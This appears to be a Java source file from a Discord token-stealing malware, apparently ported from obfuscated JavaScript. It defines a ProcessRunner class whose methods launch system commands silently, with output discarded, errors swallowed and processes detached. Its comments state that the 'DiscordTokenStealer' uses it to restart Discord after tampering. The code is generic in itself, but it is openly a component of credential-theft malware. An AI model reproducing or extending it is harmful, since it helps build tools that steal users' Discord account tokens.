/**
 * Utility class for running system processes silently.
 * Obfuscated name: \u04dd (process execution parts)
 *
 * Used by DiscordTokenStealer to restart Discord applications.
 */
public class ProcessRunner {

    /**
     * Runs a command silently (no window, detached).
     * Equivalent to spawn() with windowsHide: true, stdio: 'ignore', detached: true
     *
     * @param command Command array to execute
     */
    public static void run(String[] command) {
        try {
            ProcessBuilder pb = new ProcessBuilder(command);
            pb.redirectErrorStream(false);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process p = pb.start();
            // Don't wait — fire and forget
        } catch (Exception ignored) {}
    }

    /**
     * Runs a command and waits for completion.
     *
     * @param command Command array to execute
     */
    public static void runAndWait(String[] command) {
        try {
            ProcessBuilder pb = new ProcessBuilder(command);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            Process p = pb.start();
            p.waitFor();
        } catch (Exception ignored) {}
    }
}
